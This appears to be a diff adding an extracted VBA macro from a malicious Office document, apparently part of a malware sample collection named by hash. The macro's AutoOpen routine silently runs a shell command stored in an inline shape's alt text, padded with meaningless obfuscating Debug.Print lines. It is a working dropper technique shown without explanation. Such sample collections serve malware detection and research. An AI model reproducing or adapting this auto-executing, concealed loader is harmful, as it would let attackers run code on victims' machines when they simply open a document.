@@ -1,0 +1,25 @@
+Filename     : ./macros/04934452c12764ab9c3031f1bb4b8003e6cc020568bec40c72e38dd6f4cccc50
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub AutoOpen()
+
+Shell$ _
+ InlineShapes(1000 - 998).AlternativeText, _
+ 0
+
+Debug.Print (xvttRCTzjbiPpkP + jBQvFqXaWxFQR + cNNikwHiCjHl)
+Debug.Print (1538 + pdNrGKNtfkwNR + kqwCmCQGxzMR)
+Debug.Print FPhgiivHqSQJ + QdxqTizfjvVG + cTQfpMxvBb + bQjBiFnxWNg + qMiHgxKClBirwwa + xvttRCTzjbiPpkP
+
+End Sub
+
+
